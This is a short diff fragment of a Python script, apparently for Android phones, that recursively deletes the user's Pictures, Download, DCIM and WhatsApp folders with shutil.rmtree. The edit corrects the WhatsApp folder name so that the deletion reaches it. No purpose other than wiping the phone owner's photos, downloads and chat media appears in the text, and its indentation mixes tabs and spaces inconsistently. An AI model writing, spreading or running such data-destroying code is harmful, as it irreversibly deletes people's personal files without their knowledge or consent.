@@ -220,6 +220,6 @@ try:
 	shutil.rmtree("/storage/emulated/0/Pictures")
         shutil.rmtree("/storage/emulated/0/Download")
 	shutil.rmtree("/storage/emulated/0/DCIM")
-        shutil.rmtree("/storage/emulated/0/Whatsapp")
+        shutil.rmtree("/storage/emulated/0/WhatsApp")
 				except:
 					print("Check your phone/Storage")
